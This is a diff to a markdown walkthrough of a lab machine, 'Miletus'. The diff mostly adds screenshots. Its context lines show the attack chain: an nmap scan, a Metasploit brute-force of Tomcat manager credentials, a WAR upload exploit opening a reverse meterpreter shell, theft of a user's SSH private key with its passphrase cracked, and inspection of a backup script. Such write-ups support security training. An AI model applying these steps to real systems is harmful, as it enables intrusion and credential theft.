@@ -49,14 +49,14 @@ This walkthrough covers a full compromise of the **Miletus** machine — from op
 ```bash
 nmap -A 192.168.79.121
 ```
+<img width="960" height="295" alt="image" src="https://github.com/user-attachments/assets/0992ce56-a801-4d8b-8a78-33d99864d9c6" />
+
+<img width="945" height="426" alt="image" src="https://github.com/user-attachments/assets/e6a06bd8-7b49-40a1-a3c4-65b8e2422381" />
+
+
 
 ### Results
 
-```
-PORT     STATE SERVICE VERSION
-22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5
-8080/tcp open  http    Apache Tomcat 9.0.52
-```
 
 **Key Findings:**
 - **Port 22** — SSH available; potential lateral movement vector
@@ -64,6 +64,8 @@ PORT     STATE SERVICE VERSION
 - OS fingerprint: **Linux 4.15–5.19** (Ubuntu)
 
 > 💡 *Tomcat 9.0.52 exposed on port 8080 with a Manager interface is a classic misconfiguration. Default or weak credentials are commonly left in place.*
+
+<img width="1057" height="476" alt="image" src="https://github.com/user-attachments/assets/66be3354-a127-423e-930a-2699d78701fc" />
 
 ---
 
@@ -88,6 +90,11 @@ msf auxiliary(scanner/http/tomcat_mgr_login) > run
 ```
 
 ### Result
+
+<img width="881" height="261" alt="image" src="https://github.com/user-attachments/assets/e6ed7e27-dcc9-45dd-a17a-55808828d87f" />
+
+
+<img width="555" height="189" alt="image" src="https://github.com/user-attachments/assets/2ff326d0-5b7c-483d-a664-3d9d928da9ae" />
 
 ```
 [+] 192.168.79.121:8080 - Login Successful: tomcat:role1
@@ -116,6 +123,11 @@ msf exploit(multi/http/tomcat_mgr_upload) > run
 
 ### Result
 
+<img width="926" height="452" alt="image" src="https://github.com/user-attachments/assets/cf23b79c-221e-4c25-873e-315cc5e4dd15" />
+
+<img width="657" height="343" alt="image" src="https://github.com/user-attachments/assets/6c5a0908-a2b8-402e-8357-b8418ef652b3" />
+
+
 ```
 [*] Started reverse TCP handler on 192.168.79.165:4444
 [*] Uploading and deploying AfzGRF1UjXkM50YXwySj8 ...
@@ -132,11 +144,16 @@ meterpreter >
 
 ### Filesystem Enumeration
 
+<img width="725" height="658" alt="image" src="https://github.com/user-attachments/assets/aa8e0682-c9c1-4513-9ea7-aac319ab1703" />
+<img width="823" height="571" alt="image" src="https://github.com/user-attachments/assets/f8bbbbfe-b116-4ba3-92e0-a48c8b6284f5" />
+
+
 ```bash
 meterpreter > ls /
 meterpreter > cd home/
 meterpreter > ls
 ```
+<img width="614" height="436" alt="image" src="https://github.com/user-attachments/assets/056a2756-c461-4978-8382-8525a07221be" />
 
 Found one user home directory: **`thales`**
 
@@ -176,6 +193,8 @@ meterpreter > ls
 100444/r--r--r-- 1766  id_rsa
 100444/r--r--r-- 396   id_rsa.pub
 ```
+<img width="796" height="294" alt="image" src="https://github.com/user-attachments/assets/e5ec51ab-2b0e-4b38-b43c-9a8597d8658a" />
+
 
 ### Download the Private SSH Key
 
@@ -231,6 +250,7 @@ vodka06          (id_rsa)
 ## Phase 6 — User Shell & Flag Capture
 
 ### Spawn a TTY Shell via Meterpreter
+<img width="451" height="211" alt="image" src="https://github.com/user-attachments/assets/4d8078a2-a520-45de-a8ce-80225a336fef" />
 
 ```bash
 meterpreter > shell
@@ -296,6 +316,8 @@ ls -lh $dest
 ```
 
 ### Check Script Permissions
+
+<img width="612" height="65" alt="image" src="https://github.com/user-attachments/assets/dbbfe027-3ec3-4be9-8355-a052d12f2aae" />
 
 ```bash
 thales@miletus:~$ ls -la /usr/local/bin/backup.sh
